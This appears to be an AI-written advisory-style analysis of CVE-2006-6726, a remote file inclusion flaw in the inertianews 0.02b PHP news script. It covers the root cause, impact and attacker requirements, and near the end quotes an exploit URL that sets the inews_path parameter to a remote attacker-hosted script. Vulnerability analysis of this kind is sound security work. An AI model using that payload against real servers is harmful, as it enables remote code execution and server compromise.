Based on the provided information, here's an analysis of CVE-2006-6726:

**Root Cause of Vulnerability:**

*   The vulnerability stems from a remote file inclusion (RFI) weakness in the `inertianews_main.php` file of the `inertianews` application. Specifically, the application uses a `require` statement on the `$inews_path` variable without proper sanitization, allowing an attacker to control the path of the included file.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The application's code directly includes a file path provided by a user-supplied parameter (`inews_path`) using the `require()` function without validating or sanitizing it. This allows an attacker to specify a remote file.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By exploiting the RFI vulnerability, an attacker can include and execute arbitrary code from a remote server on the target server running the vulnerable application. This could lead to complete compromise of the server, data theft, or other malicious activities.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability is exploited by crafting a malicious HTTP GET request to `inertianews_main.php`, where the `inews_path` parameter is set to point to a malicious remote file.
*   **Remote URL:** The attacker provides a remote URL via the `inews_path` GET parameter, pointing to a script under their control.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the server running the vulnerable application.
*   **Knowledge of the Vulnerable Application:** The attacker needs to know the location of the vulnerable script (`inertianews_main.php`) and the vulnerable parameter (`inews_path`).
*   **Web server hosting attacker's script:** The attacker needs a webserver to host the malicious script that is going to be remotely included via RFI.

**Additional Details:**

*   The vulnerability was found in `inertianews` version 0.02b.
*   The exploit example provided shows a crafted URL: `http://[host]/[inertia_dir]/inertianews_main.php?inews_path=http://[TroubleScript]`, which includes a remote script.

In summary, CVE-2006-6726 is a remote file inclusion vulnerability in `inertianews` that allows an attacker to execute arbitrary code on the vulnerable server by including malicious remote files.
